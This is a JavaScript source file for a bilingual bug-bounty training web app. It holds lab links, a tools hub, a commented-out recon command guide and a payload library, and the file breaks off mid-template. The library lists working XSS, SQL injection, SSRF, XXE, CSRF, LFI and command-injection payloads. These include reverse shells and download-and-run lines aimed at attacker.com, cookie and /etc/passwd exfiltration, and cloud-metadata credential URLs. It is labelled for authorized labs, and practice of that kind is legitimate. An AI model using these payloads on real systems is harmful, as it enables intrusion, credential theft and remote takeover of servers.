                <p class="small text-muted">${txt('منصة رائدة مع برامج متعددة', 'Leading platform with diverse programs')}</p>
                <a href="https://www.bugcrowd.com/" target="_blank" class="btn btn-sm btn-outline-success w-100">
                  <i class="fa-solid fa-link"></i> ${txt('زيارة', 'Visit')}
                </a>
              </div>
            </div>
          </div>
          <div class="col-md-4">
            <div class="card h-100">
              <div class="card-body">
                <h6 class="fw-bold">Intigriti</h6>
                <p class="small text-muted">${txt('منصة أوروبية متقدمة', 'Leading European platform')}</p>
                <a href="https://www.intigriti.com/" target="_blank" class="btn btn-sm btn-outline-warning w-100">
                  <i class="fa-solid fa-link"></i> ${txt('زيارة', 'Visit')}
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div > `;
}

function pageLabs() {
  return `
    < h2 > ${txt('المختبرات والملاعب', 'Labs & Playgrounds')}</h2 >
  <ul>
    <li>
      <a href="https://portswigger.net/web-security" target="_blank">PortSwigger Web Academy</a>
      – ${txt('تمارين XSS, SQLi, CSRF', 'XSS, SQLi, CSRF labs')}
    </li>
    <li>
      <a href="https://juice-shop.herokuapp.com" target="_blank">OWASP Juice Shop</a>
      – ${txt('تطبيق متكامل بالثغرات', 'Full-blown vulnerable app')}
    </li>
    <li>
      <a href="https://github.com/WebGoat/WebGoat" target="_blank">WebGoat</a>
      – ${txt('تطبيق تعليمي من OWASP', 'OWASP educational app')}
    </li>
    <li>
      <a href="https://tryhackme.com" target="_blank">TryHackMe</a>
      – ${txt('مسارات Web & BugBounty', 'Web & BugBounty paths')}
    </li>
    <li>
      <a href="https://www.hackthebox.com" target="_blank">HackTheBox</a>
      – ${txt('أجهزة عملياتية مع Web Challenges', 'Machines with Web challenges')}
    </li>
  </ul>

  <p>${txt('نصيحة: أنشئ جدولاً أسبوعيًا وضع خانات اكتمال لكل مختبر.',
    'Tip: create a weekly schedule and tick every lab.')}</p>`;
}

function pageTools() {
  setTimeout(() => {
    // Initialize search functionality for tools
    const searchInput = document.getElementById('tools-search');
    if (searchInput) {
      searchInput.addEventListener('input', (e) => {
        const query = e.target.value.toLowerCase();
        document.querySelectorAll('.tool-card-item').forEach(card => {
          const text = card.textContent.toLowerCase();
          card.closest('.col-md-4').style.display = text.includes(query) ? 'block' : 'none';
        });
      });
    }
  }, 500);

  // Helper to render tool cards
  const renderToolCard = (id, tool) => `
    <div class="col-md-4">
      <div class="card h-100 tool-card-item shadow-sm hover-elevate">
        <div class="card-body text-center">
          <div class="tool-icon mb-3">
            <i class="fa-solid fa-${tool.icon || 'screwdriver-wrench'} fa-3x" style="background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"></i>
          </div>
          <h5 class="card-title fw-bold">${currentLang === 'ar' ? tool.titleAr || tool.title : tool.title}</h5>
          <p class="card-text text-muted small">${currentLang === 'ar' ? tool.descAr || tool.description || '' : tool.description || ''}</p>
          <button class="btn btn-outline-primary w-100 rounded-pill mt-2" onclick="loadTool('${id}')">
            ${txt('فتح الأداة', 'Open Tool')} <i class="fa-solid fa-arrow-right"></i>
          </button>
        </div>
      </div>
    </div>
  `;

  // Aggregate all tools from securityTools
  let toolsHtml = '';

  if (typeof securityTools !== 'undefined') {
    // 1. Subdomain Finder
    toolsHtml += renderToolCard('subdomainFinder', { ...securityTools.subdomainFinder, icon: 'globe' });
    // 2. Reverse Shells
    toolsHtml += renderToolCard('reverseShells', { ...securityTools.reverseShells, icon: 'terminal' });
    // 3. Payload Generator
    toolsHtml += renderToolCard('payloads', { ...securityTools.payloads, icon: 'bug' });
    // 4. Encoders
    toolsHtml += renderToolCard('encoders', { ...securityTools.encoders, icon: 'code' });
    // 5. Hash Identifier
    toolsHtml += renderToolCard('hashIdentifier', { ...securityTools.hashIdentifier, icon: 'hashtag' });
    // 6. Header Analyzer
    toolsHtml += renderToolCard('headerAnalyzer', { ...securityTools.headerAnalyzer, icon: 'shield-halved' });
    // 7. Port Reference
    toolsHtml += renderToolCard('portReference', { ...securityTools.portReference, icon: 'network-wired' });
  }

  return `
    <div class="container-fluid mt-4">
      <div class="text-center mb-5">
        <h2 class="display-5 fw-bold mb-3">
          <i class="fa-solid fa-screwdriver-wrench text-primary"></i> ${txt('مركز الأدوات', 'Tools Hub')}
        </h2>
        <p class="lead text-muted">${txt('مجموعة أدوات احترافية لاختبار الاختراق والأمن السيبراني تعمل مباشرة في المتصفح.', 'Professional cybersecurity and penetration testing tools running directly in your browser.')}</p>
        
        <div class="row justify-content-center mt-4">
          <div class="col-md-6">
            <div class="input-group input-group-lg shadow-sm">
              <span class="input-group-text bg-white border-end-0"><i class="fa-solid fa-search text-muted"></i></span>
              <input type="text" id="tools-search" class="form-control border-start-0" placeholder="${txt('بحث عن أداة...', 'Search for a tool...')}">
            </div>
          </div>
        </div>
      </div>

      <div class="row g-4 px-4">
        ${toolsHtml}
      </div>

      <!-- Additional Resources Section -->
      <div class="row mt-5 mb-4">
        <div class="col-12">
          <div class="card bg-light border-0">
            <div class="card-body p-4 text-center">
              <h5><i class="fa-solid fa-book"></i> ${txt('هل تحتاج مساعدة؟', 'Need Help?')}</h5>
              <p>${txt('راجع التوثيق والموارد التعليمية للتعرف على كيفية استخدام الأدوات بفعالية.', 'Check the documentation and learning resources to learn how to use tools effectively.')}</p>
              <a href="https://www.google.com/search?q=cybersecurity+tools+tutorial" target="_blank" class="btn btn-sm btn-dark">
                ${txt('بحث عن شروحات', 'Search Tutorials')}
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  `;
}
/*
function pageTools_OLD() {
  return `
    < h2 > ${txt('الأدوات والأتمتة', 'Tools & Automation')}</h2 >
   <div class="card mb-4">
      <div class="card-header bg-primary text-white">
        <h5 class="mb-0"><i class="fa-solid fa-route"></i> ${txt('منهجية Recon – Pipeline كامل', 'Full Recon Pipeline')}</h5>
      </div>
      <div class="card-body">
        <ol>
          <li><strong>Amass:</strong> جمع النطاقات الرئيسية
            ${cmdBox('amass enum -d example.com -o domains.txt')}
          </li>
          <li><strong>Subfinder:</strong> استخراج الدومينات الفرعية
            ${cmdBox('subfinder -d example.com -o subs.txt')}
          </li>
          <li><strong>Assetfinder:</strong> دومينات إضافية (Go)
            ${cmdBox('assetfinder example.com>> subs.txt')}
          </li>
          <li><strong>GitHub-subdomains:</strong> استخراج من كود GitHub
            ${cmdBox('github-subdomains -d example.com -t GITHUB_TOKEN -o github-subs.txt')}
          </li>
          <li><strong>Crt.sh (ويب):</strong>
            <a href="https://crt.sh/?q=%25.example.com" target="_blank" class="btn btn-sm btn-outline-secondary">افتح crt.sh</a>
          </li>
          <li><strong>حذف التكرارات:</strong>
            ${cmdBox('cat domains.txt subs.txt github-subs.txt | sort -u> all-subs.txt')}
          </li>
          <li><strong>HTTPX (فحص الاستجابة):</strong>
            ${cmdBox('cat all-subs.txt | httpx -title -tech -o live.txt')}
          </li>
          <li><strong>Waybackurls:</strong> استخراج URLs تاريخية
            ${cmdBox('cat live.txt | waybackurls> wayback.txt')}
          </li>
          <li><strong>Gau:</strong> مصدر URLs إضافي
            ${cmdBox('cat live.txt | gau>> wayback.txt')}
          </li>
          <li><strong>Uniq & فلترة:</strong>
            ${cmdBox('sort -u wayback.txt> wayback-uniq.txt')}
          </li>
          <li><strong>Httpx (فحص الروابط):</strong>
            ${cmdBox('cat wayback-uniq.txt | httpx -mc 200,301,302 -o wayback-live.txt')}
          </li>
        </ol>
      </div>
    </div>
    <div class="card mb-4">
      <div class="card-header bg-success text-white">
        <h5 class="mb-0"><i class="fa-solid fa-magnifying-glass-plus"></i> ${txt('اكتشاف المحتوى & Fuzzing', 'Content Discovery & Fuzzing')}</h5>
      </div>
      <div class="card-body">
        <ul>
          <li><strong>FFUF – مسارات:</strong>
            ${cmdBox('ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt')}
          </li>
          <li><strong>FFUF – ملحقات:</strong>
            ${cmdBox('ffuf -u http://target/FUZZ -w words.txt -x .php,.txt,.js')}
          </li>
          <li><strong>Gobuster (DNS):</strong>
            ${cmdBox('gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt')}
          </li>
          <li><strong>Gobuster (Dir):</strong>
            ${cmdBox('gobuster dir -u http://target -w /usr/share/wordlists/dirb/big.txt -x php,asp,aspx,jsp,txt,conf,config')}
          </li>
          <li><strong>Dirb (كلاسيكي):</strong>
            ${cmdBox('dirb http://target /usr/share/wordlists/dirb/common.txt')}
          </li>
          <li><strong>Whatweb – بصمة تقنية:</strong>
            ${cmdBox('whatweb http://target')}
          </li>
          <li><strong>Wappalyzer CLI:</strong>
            ${cmdBox('wappalyzer http://target')}
          </li>
          <li><strong>Aquatone (لقطة شاشة جماعية):</strong>
            ${cmdBox('cat live.txt | aquatone -ports xlarge')}
          </li>
        </ul>
      </div>
    </div> 
    <div class="card mb-4">
      <div class="card-header bg-danger text-white">
        <h5 class="mb-0"><i class="fa-solid fa-bug"></i> ${txt('فحص الثغرات', 'Vulnerability Scanning')}</h5>
      </div>
      <div class="card-body">
        <ul>
          <li><strong>Nuclei – تشغيل سريع:</strong>
            ${cmdBox('nuclei -l live.txt -t cves/')}
          </li>
          <li><strong>Nuclei – جميع القوالب:</strong>
            ${cmdBox('nuclei -l live.txt -t ~/nuclei-templates')}
          </li>
          <li><strong>Nikto:</strong>
            ${cmdBox('nikto -h http://target')}
          </li>
          <li><strong>OWASP ZAP (CLI):</strong>
            ${cmdBox('zap-cli quick-scan --self-contained http://target')}
          </li>
          <li><strong>OpenVAS (Docker):</strong>
            ${cmdBox('docker run -d -p 9392:9392 --name openvas mikesplain/openvas')}
          </li>
        </ul>
      </div>
    </div>
    <div class="card mb-4">
      <div class="card-header bg-warning text-dark">
        <h5 class="mb-0"><i class="fa-solid fa-cube"></i> ${txt('فحص CMS وإطارات العمل', 'CMS & Framework Scanning')}</h5>
      </div>
      <div class="card-body">
        <ul>
          <li><strong>WPScan – WordPress:</strong>
            ${cmdBox('wpscan --url http://target -e ap,at,cb,dbe,u1-100')}
          </li>
          <li><strong>DroopeScan – Drupal:</strong>
            ${cmdBox('droopescan scan drupal -u http://target')}
          </li>
          <li><strong>JoomScan – Joomla:</strong>
            ${cmdBox('joomscan --url http://target')}
          </li>
          <li><strong>CMSmap – متعدد CMS:</strong>
            ${cmdBox('cmsmap http://target')}
          </li>
          <li><strong>Wig – WebApp Information Gatherer:</strong>
            ${cmdBox('wig http://target')}
          </li>
        </ul>
      </div>
    </div>
    <div class="card mb-4">
      <div class="card-header bg-info text-white">
        <h5 class="mb-0"><i class="fa-solid fa-plug"></i> ${txt('فحص APIs & GraphQL', 'API & GraphQL Testing')}</h5>
      </div>
      <div class="card-body">
        <ul>
          <li><strong>Kiterunner – API fuzzing:</strong>
            ${cmdBox('kr scan http://target -w routes-large.kite')}
          </li>
          <li><strong>Arjun – HTTP parameter discovery:</strong>
            ${cmdBox('arjun -u http://target')}
          </li>
          <li><strong>Postman + Runner:</strong>
            <span class="text-muted">${txt('استخدم مجموعات اختبار جاهزة ثم شغّل Runner', 'Import ready-made collections then run Runner')}</span>
          </li>
          <li><strong>GraphQL Voyager (ويب):</strong>
            <a href="https://apis.guru/graphql-voyager/" target="_blank" class="btn btn-sm btn-outline-secondary">افتح Voyager</a>
          </li>
          <li><strong>GraphQL Map:</strong>
            ${cmdBox('python3 graphqlmap.py -u http://target/graphql')}
          </li>
        </ul>
      </div>
    </div>
    <div class="card mb-4">
      <div class="card-header bg-secondary text-white">
        <h5 class="mb-0"><i class="fa-solid fa-key"></i> ${txt('البحث عن أسرار JS وملفات', 'JS Files & Secrets Scanning')}</h5>
      </div>
      <div class="card-body">
        <ul>
          <li><strong>LinkFinder – استخراج الروابط من JS:</strong>
            ${cmdBox('python3 linkfinder.py -i http://target/app.js -o cli')}
          </li>
          <li><strong>SecretFinder – أسرار JS:</strong>
            ${cmdBox('python3 SecretFinder.py -i http://target/app.js -o cli')}
          </li>
          <li><strong>JS-Scan (bash):</strong>
            ${cmdBox('cat wayback-live.txt | grep  "\\.js$" | xargs -I %% bash -c "echo %% && curl -s %% | grep -Eoi \'(api_key|apikey|token|secret|password)\'"')}
          </li>
          <li><strong>TruffleHog – Git secrets:</strong>
            ${cmdBox('trufflehog git https://github.com/org/repo')}
          </li>
        </ul>
      </div>
    </div>
    <div class="card mb-4">
      <div class="card-header bg-dark text-white">
        <h5 class="mb-0"><i class="fa-brands fa-python"></i> ${txt('سكريبتات أتمتة بايثون', 'Python Automation Snippets')}</h5>
      </div>
      <div class="card-body">
        <p>${txt('سكريبت سريع لفحص الاستجابة واستخراج العناوين:', 'Quick script to check response and parse links:')}</p>
        ${cmdBox(`import requests, re, sys
target = sys.argv[1]
r = requests.get(target, timeout=5)
print("Status:", r.status_code)
print("Server:", r.headers.get('Server', 'Unknown'))
links = re.findall(r'href=["\\'](.*?)["\\']', r.text)
print("Links found:", len(links))
for l in links[:10]:
    print("  ->", l)`, 'Usage: python3 quick.py http://target')}
      </div>
    </div>
    <div class="card">
      <div class="card-header bg-light text-dark">
        <h5 class="mb-0"><i class="fa-solid fa-terminal"></i> ${txt('One-Liners سريعة', 'Quick One-Liners')}</h5>
      </div>
      <div class="card-body">
        <ul>
          <li>${txt('جميع الـ IPs لفكرة عن النطاق:', 'All IPs for a quick map:')}<br>
            ${cmdBox('cat subs.txt | xargs -I % dig +short % | grep -E "^[0-9]" | sort -u')}
          </li>
          <li>${txt('استخراج عنوان الـ Title لكل subdomain:', 'Grab Title for every subdomain:')}<br>
            ${cmdBox('cat live.txt | xargs -I % bash -c "echo -n % && curl -s % | grep -oP \'(?<=<title>).*?(?=</title>)\'"')}
          </li>
          <li>${txt('فحص CORS مبسّط:', 'Simple CORS check:')}<br>
            ${cmdBox('curl -s -H "Origin: http://evil.com" -I http://target | grep -i "Access-Control-Allow-Origin"')}
          </li>
        </ul>
      </div>
    </div>
  `;
}
*/

function pagePayloads() {
  // v2.0 - 8 vulnerability categories with expanded payloads
  console.log('Loading Payloads v2.0 with 8 categories');
  const payloadCategories = [
    {
      title: 'XSS',
      icon: 'fa-xmarks-lines',
      color: 'warning',
      question: txt('ما هو XSS؟', 'What is XSS?'),
      answer: txt(
        'Cross-Site Scripting - حقن أكواد JavaScript خبيثة في صفحات الويب. يمكن استخدامه لسرقة الجلسات، تغيير محتوى الصفحة، أو توجيه المستخدمين لصفحات خبيثة.',
        'Cross-Site Scripting - Injecting malicious JavaScript into web pages. Can be used to steal sessions, modify page content, or redirect users to malicious pages.'
      ),
      payloads: [
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '&lt;img src=x onerror=alert(1)&gt;',
        '&lt;svg onload=alert(1)&gt;',
        '&lt;iframe src="javascript:alert(1)"&gt;',
        '&lt;body onload=alert(1)&gt;',
        '&lt;input autofocus onfocus=alert(1)&gt;',
        '&lt;select autofocus onfocus=alert(1)&gt;',
        '&lt;textarea autofocus onfocus=alert(1)&gt;',
        '&lt;marquee onstart=alert(1)&gt;',
        '&lt;div onmouseover="alert(1)"&gt;hover me&lt;/div&gt;',
        'javascript:alert(document.cookie)',
        '&lt;script src=//evil.com/xss.js&gt;&lt;/script&gt;',
        '&lt;img src=x onerror=fetch(\'http://attacker.com/?c=\'+document.cookie)&gt;',
        '&quot;&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;',
        '&lt;svg/onload=alert(1)&gt;',
        '&lt;details open ontoggle=alert(1)&gt;',
        '&lt;script&gt;document.location="http://attacker.com/steal.php?c="+document.cookie&lt;/script&gt;',
        '&lt;img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))"&gt;',
        '&lt;svg&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;',
        '&lt;iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"&gt;',
        '&lt;math&gt;&lt;mi&gt;&lt;script&gt;alert(1)&lt;/script&gt;'
      ]
    },
    {
      title: 'SQL Injection',
      icon: 'fa-database',
      color: 'danger',
      question: txt('ما هو SQL Injection؟', 'What is SQL Injection?'),
      answer: txt(
        'حقن أوامر SQL خبيثة للوصول أو تعديل قاعدة البيانات. يمكن استخدامه لتجاوز المصادقة، سرقة البيانات، أو حذف الجداول.',
        'Injecting malicious SQL commands to access or modify the database. Can bypass authentication, steal data, or delete tables.'
      ),
      payloads: [
        "' OR '1'='1' --",
        "admin'--",
        "1' UNION SELECT null,version()--",
        "1' AND SLEEP(5)--",
        "' OR 1=1--",
        "\" OR \"\"=\"",
        "' OR 'x'='x",
        "1' UNION SELECT username,password FROM users--",
        "1' ORDER BY 10--",
        "1' AND pg_sleep(5)--",
        "1' UNION SELECT null,null,database()--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' UNION SELECT table_name,null FROM information_schema.tables--",
        "1' AND IF(1=1,SLEEP(5),0)--",
        "\\' OR 1=1--",
        "' OR '1'='1'/*",
        "admin' OR 1=1#",
        "' UNION SELECT null,@@version--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--",
        "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(schema_name AS CHAR),0x7e)) FROM information_schema.schemata LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND 'v'='v",
        "1' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()))),1)--",
        "1' AND JSON_EXTRACT(@@version, '$')--"
      ]
    },
    {
      title: 'SSRF',
      icon: 'fa-server',
      color: 'info',
      question: txt('ما هو SSRF؟', 'What is SSRF?'),
      answer: txt(
        'Server-Side Request Forgery - إجبار الخادم على إرسال طلبات لموارد داخلية. يستخدم للوصول للخدمات الداخلية، metadata السحابة، أو تجاوز جدران الحماية.',
        'Server-Side Request Forgery - Forcing the server to make requests to internal resources. Used to access internal services, cloud metadata, or bypass firewalls.'
      ),
      payloads: [
        'http://169.254.169.254/latest/meta-data/',
        'http://localhost:22',
        'file:///etc/passwd',
        'http://127.0.0.1:8080',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://[::1]:80',
        'http://127.0.0.1:3306',
        'http://localhost/admin',
        'gopher://127.0.0.1:25/_MAIL FROM:attacker',
        'dict://127.0.0.1:11211/stat',
        'http://0.0.0.0:8080',
        'http://localhost:6379',
        'file:///etc/hosts',
        'http://169.254.169.254/latest/user-data/',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        'http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance/',
        'http://169.254.169.254/latest/dynamic/instance-identity/document',
        'http://169.254.169.254/latest/user-data/0',
        'http://169.254.169.254/',
        'http://169.254.169.254/latest/meta-data/placement/availability-zone',
        'http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key',
        'http://169.254.169.254/latest/meta-data/hostname',
        'http://169.254.169.254/latest/meta-data/public-ipv4'
      ]
    },
    {
      title: 'Command Injection',
      icon: 'fa-terminal',
      color: 'dark',
      question: txt('ما هو Command Injection؟', 'What is Command Injection?'),
      answer: txt(
        'حقن أوامر نظام التشغيل في التطبيق. يسمح بتنفيذ أوامر على الخادم، الوصول للملفات، أو الحصول على shell.',
        'Injecting OS commands into the application. Allows executing commands on the server, accessing files, or getting a shell.'
      ),
      payloads: [
        '; cat /etc/passwd',
        '| whoami',
        '&& id',
        '$(whoami)',
        '`id`',
        '; ls -la',
        '| nc -e /bin/sh attacker.com 4444',
        '&& curl http://attacker.com/shell.sh | sh',
        '; wget http://attacker.com/backdoor.sh -O /tmp/b.sh',
        '$(cat /etc/shadow)',
        '`cat / etc / passwd`',
        '; uname -a',
        '|| whoami',
        '& ping -c 10 attacker.com &',
        '; /bin/bash -i>& /dev/tcp/attacker.com/4444 0>&1',
        '$(curl http://attacker.com/?data=$(cat /etc/passwd))',
        '; bash -c "bash -i>& /dev/tcp/attacker.com/4444 0>&1"',
        '| python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'attacker.com\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"',
        '& perl -e \'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
        '; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444>/tmp/f',
        '|| python -c "exec(\'ZHVtcA==\'.decode(\'base64\'))"'
      ]
    },
    {
      title: 'XXE',
      icon: 'fa-file-xml',
      color: 'secondary',
      question: txt('ما هو XXE؟', 'What is XXE?'),
      answer: txt(
        'XML External Entity - استغلال معالج XML لقراءة ملفات محلية أو إجراء طلبات SSRF. يستخدم لسرقة الملفات الحساسة أو مسح الشبكة الداخلية.',
        'XML External Entity - Exploiting XML parser to read local files or perform SSRF. Used to steal sensitive files or scan internal network.'
      ),
      payloads: [
        '&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;',
        '&lt;!ENTITY xxe SYSTEM "http://attacker.com/xxe.xml"&gt;',
        '&lt;!DOCTYPE xxe [&lt;!ENTITY % d SYSTEM "http://evil.com/evil.dtd"&gt; %d;]&gt;',
        '&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"&gt;',
        '&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;',
        '&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'&gt;"&gt;%eval;%exfil;',
        '&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:///dev/random"&gt;]&gt;&lt;foo&gt;&xxe;&lt;/foo&gt;',
        '&lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;%dtd;',
        '&lt;!DOCTYPE data [&lt;!ENTITY file SYSTEM "file:///etc/shadow"&gt;]&gt;&lt;data&gt;&file;&lt;/data&gt;',
        '&lt;!ENTITY xxe SYSTEM "expect://id"&gt;',
        '&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;&lt;foo&gt;&xxe;&lt;/foo&gt;',
        '&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"&gt; %xxe; ]&gt;',
        '&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=config.php"&gt;&lt;!ENTITY % dtd "&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY % eval SYSTEM \'file:///invalid/xxx/\'&gt;"&gt;',
        '&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt; &lt;!ENTITY % dtd "&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY % eval SYSTEM \'file:///invalid/xxx/\'&gt;"&gt; %dtd; %eval;]&gt;',
        '&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://attacker.com/ext.dtd"&gt; %xxe;]&gt;'
      ]
    },
    {
      title: 'CSRF',
      icon: 'fa-shield-halved',
      color: 'primary',
      question: txt('ما هو CSRF؟', 'What is CSRF?'),
      answer: txt(
        'Cross-Site Request Forgery - إجبار المستخدم على تنفيذ إجراءات غير مرغوبة. يستخدم لتغيير البيانات، تحويل الأموال، أو تغيير كلمات المرور.',
        'Cross-Site Request Forgery - Forcing users to perform unwanted actions. Used to change data, transfer money, or change passwords.'
      ),
      payloads: [
        '&lt;img src="http://target/change-email?email=attacker@evil.com"&gt;',
        '&lt;form action="http://target/transfer" method="POST"&gt;&lt;input type="hidden" name="amount" value="1000"&gt;&lt;/form&gt;',
        '&lt;form action="http://target/delete-account" method="POST" id="csrf"&gt;&lt;/form&gt;&lt;script&gt;document.getElementById("csrf").submit()&lt;/script&gt;',
        '&lt;iframe style="display:none" name="csrf-frame"&gt;&lt;/iframe&gt;&lt;form method="POST" action="http://target/change-password" target="csrf-frame"&gt;&lt;input type="hidden" name="password" value="hacked123"&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;',
        'fetch(\'http://target/api/transfer\', {method: \'POST\', body: JSON.stringify({amount: 1000, to: \'attacker\'}), credentials: \'include\', headers: {\'Content-Type\': \'application/json\'}})',
        '&lt;img src="http://target/admin/delete-user?id=123"&gt;',
        '&lt;form action="http://target/settings" method="POST"&gt;&lt;input type="hidden" name="admin" value="true"&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;',
        '&lt;link rel="prerender" href="http://target/logout"&gt;',
        '&lt;form action="http://target/api/transfer" method="POST"&gt;&lt;input type="hidden" name="to" value="attacker"&gt;&lt;input type="hidden" name="amount" value="1000"&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;',
        '&lt;img src="http://target/api/delete-account" onload="fetch(\'http://target/api/delete-account\', {method: \'POST\', credentials: \'include\'})"&gt;',
        '&lt;form id="csrf" action="http://target/change-password" method="POST"&gt;&lt;input type="hidden" name="password" value="owned123"&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(\'csrf\').submit()&lt;/script&gt;',
        '&lt;iframe src="javascript:document.forms[0].submit()"&gt;&lt;/iframe&gt;'
      ]
    },
    {
      title: 'IDOR',
      icon: 'fa-key',
      color: 'success',
      question: txt('ما هو IDOR؟', 'What is IDOR?'),
      answer: txt(
        'Insecure Direct Object Reference - الوصول لموارد الآخرين بتغيير المعرفات. يستخدم للوصول لملفات، حسابات، أو بيانات المستخدمين الآخرين.',
        'Insecure Direct Object Reference - Accessing others\' resources by changing identifiers. Used to access files, accounts, or other users\' data.'
      ),
      payloads: [
        '/api/user/1/profile',
        '/documents/invoice_123.pdf',
        '/admin/users?id=2',
        '/download?file=../../../etc/passwd',
        '/api/account/456/details',
        '/files/document.pdf?id=100',
        '/user/settings?user_id=999',
        '/messages/read?msg_id=500',
        '/orders/view?order=12345',
        '/admin/reports?report_id=1',
        '/api/v1/users/2/private-data',
        '/uploads/../../etc/shadow',
        '/profile?uid=administrator',
        '/api/messages?to=admin&read=true',
        '/download.php?file=/var/www/html/config.php',
        '/api/users/1/account',
        '/api/users/2/account',
        '/api/users/3/account',
        '/api/documents/secret_doc_123',
        '/api/documents/confidential_report_456',
        '/api/users/1/delete',
        '/api/users/1/reset-password',
        '/api/users/1/change-email?email=attacker@evil.com',
        '/api/users/1/role/admin'
      ]
    },
    {
      title: 'LFI/RFI',
      icon: 'fa-folder-open',
      color: 'warning',
      question: txt('ما هو LFI/RFI؟', 'What is LFI/RFI?'),
      answer: txt(
        'Local/Remote File Inclusion - تضمين ملفات محلية أو بعيدة خبيثة. يستخدم لقراءة ملفات النظام، تنفيذ أكواد، أو الحصول على shell.',
        'Local/Remote File Inclusion - Including malicious local or remote files. Used to read system files, execute code, or get a shell.'
      ),
      payloads: [
        '../../../../etc/passwd',
        'php://filter/convert.base64-encode/resource=index.php',
        'http://evil.com/shell.txt',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+',
        '../../../../../../../etc/shadow',
        'php://input',
        'php://filter/read=string.rot13/resource=config.php',
        'file:///etc/passwd',
        '....//....//....//etc/passwd',
        'zip://shell.jpg%23shell.php',
        'phar://shell.phar/shell.php',
        'expect://id',
        '/var/log/apache2/access.log',
        'php://filter/convert.iconv.utf-8.utf-16/resource=index.php',
        '../../../../../../windows/win.ini',
        '../../../../proc/self/environ',
        'php://filter/resource=/etc/passwd',
        'data://text/plain,<?php system($_GET[\'cmd\']); ?>',
        'php://filter/convert.base64-encode/resource=/var/www/html/config.php',
        '/proc/self/cmdline',
        '/proc/self/fd/0',
        '/proc/self/fd/1',
        '/proc/self/fd/2'
      ]
    }
  ];

  // Get custom payloads from localStorage
  const customPayloads = JSON.parse(localStorage.getItem('customPayloads') || '[]');

  console.log('Total categories loaded:', payloadCategories.length);
  console.log('Categories:', payloadCategories.map(c => c.title).join(', '));
  console.log('Custom payloads count:', customPayloads.length);

  return `
    <div class="container-fluid mt-4">
    <h2><i class="fa-solid fa-bug-slash"></i> ${txt('مكتبة الـ Payloads', 'Payloads Library')} <span class="badge bg-success">v2.0 - 8 Categories</span></h2>
    
    <div class="alert alert-warning">
      <i class="fa-solid fa-triangle-exclamation"></i>
      ${txt('⚠️ تعليمي فقط - استخدم على المختبرات المرخصة فقط (PortSwigger, HackTheBox, TryHackMe)', '⚠️ Educational Only - Use on authorized labs only (PortSwigger, HackTheBox, TryHackMe)')}
    </div>

    <div class="d-flex justify-content-center gap-2 mb-4">
      <button class="btn btn-success" onclick="exportPayloads()">
        <i class="fa-solid fa-file-export"></i> ${txt('تصدير Payloads', 'Export Payloads')}
      </button>
      <button class="btn btn-info" onclick="importPayloads()">
        <i class="fa-solid fa-file-import"></i> ${txt('استيراد Payloads', 'Import Payloads')}
      </button>
    </div>

    <div class="row g-4">
      ${payloadCategories.map((cat, index) => `
        <div class="col-md-6 col-lg-4">
          <div class="card h-100 shadow-sm border-${cat.color}">
            <div class="card-header bg-${cat.color} text-white">
              <h5 class="mb-0">
                <i class="fa-solid ${cat.icon}"></i> ${cat.title}
              </h5>
            </div>
            <div class="card-body">
